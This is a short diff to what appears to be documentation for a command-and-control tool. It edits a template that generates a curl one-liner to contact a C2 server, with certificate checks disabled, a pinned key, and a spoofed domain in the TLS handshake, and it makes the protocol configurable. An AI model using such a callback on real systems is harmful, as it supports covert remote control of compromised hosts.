@@ -52,7 +52,7 @@ Set the domain used in curl's TLS ServerHello message
 ```
 {{- define "curl" -}}
 
-curl -sk --pinnedpubkey sha256//{{.PubkeyFP}} --resolve kittens.com:4444:192.168.178.23 https://{{.C2Addr}}
+curl -sk --pinnedpubkey sha256//{{.PubkeyFP}} --resolve kittens.com:4444:192.168.178.23 {{.Protocol}}://{{.C2Addr}}
 
 {{- end -}}
 ```
